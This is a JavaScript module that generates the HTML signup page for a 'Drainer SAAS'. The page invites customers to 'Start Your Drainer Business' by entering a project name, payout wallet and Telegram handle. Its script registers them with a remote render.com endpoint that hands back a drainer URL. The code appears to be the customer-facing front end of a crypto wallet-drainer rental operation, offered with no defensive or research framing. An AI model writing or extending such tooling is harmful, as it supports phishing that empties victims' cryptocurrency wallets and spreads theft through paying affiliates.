const generateMarketingSite = () => {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Drainer SAAS - Start Your Business</title>
    <style>
        body { font-family: 'Arial', sans-serif; margin: 0; padding: 0; background: #0f0f23; color: #ffffff; }
        .container { max-width: 500px; margin: 40px auto; padding: 30px; background: rgba(30, 30, 60, 0.6); border-radius: 15px; border: 1px solid rgba(99, 102, 241, 0.3); }
        .form-input { width: 100%; padding: 12px; margin: 10px 0; background: #1e1e3f; border: 1px solid #6366f1; border-radius: 8px; color: white; }
        .btn { background: linear-gradient(135deg, #6366f1, #8b5cf6); color: white; padding: 14px; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-size: 1.1rem; margin-top: 10px; }
        h1 { text-align: center; background: linear-gradient(135deg, #6366f1, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Start Your Drainer Business</h1>
        
        <form id="signupForm">
            <input type="text" class="form-input" placeholder="Project Name" required>
            <input type="text" class="form-input" placeholder="Your Wallet Address (for payouts)" required>
            <input type="text" class="form-input" placeholder="Telegram Username (for support)">
            <select class="form-input">
                <option value="#6366f1">Purple</option>
                <option value="#10b981">Green</option>
            </select>
            <button type="submit" class="btn">Create My Drainer</button>
        </form>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('signupForm');
            console.log('Form element:', form);
            
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                console.log('Form submitted!');
                
                // Universal element detection
                const inputs = this.getElementsByTagName('input');
                const selects = this.getElementsByTagName('select');
                
                console.log('Inputs found:', inputs.length, 'Selects:', selects.length);
                
                if (inputs.length < 2) {
                    alert('Please fill in required fields');
                    return;
                }
                
                const formData = {
                    projectName: inputs[0].value,
                    wallet: inputs[1].value,
                    contact: inputs[2] ? inputs[2].value : '',
                    themeColor: selects[0] ? selects[0].value : '#6366f1'
                };

                console.log('Sending form data:', formData);

                try {
                    const response = await fetch('https://service-s816.onrender.com/saas/v2/register', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(formData)
                    });
                    
                    const result = await response.json();
                    console.log('API response:', result);
                    
                    if (result.success) {
                        alert('✅ Success! Your Drainer URL: ' + result.drainerUrl);
                    } else {
                        alert('❌ Error: ' + result.error);
                    }
                } catch (error) {
                    console.error('Request failed:', error);
                    alert('❌ Network error: ' + error.message);
                }
            });
        });
    </script>
</body>
</html>
  `;
};

module.exports = { generateMarketingSite };
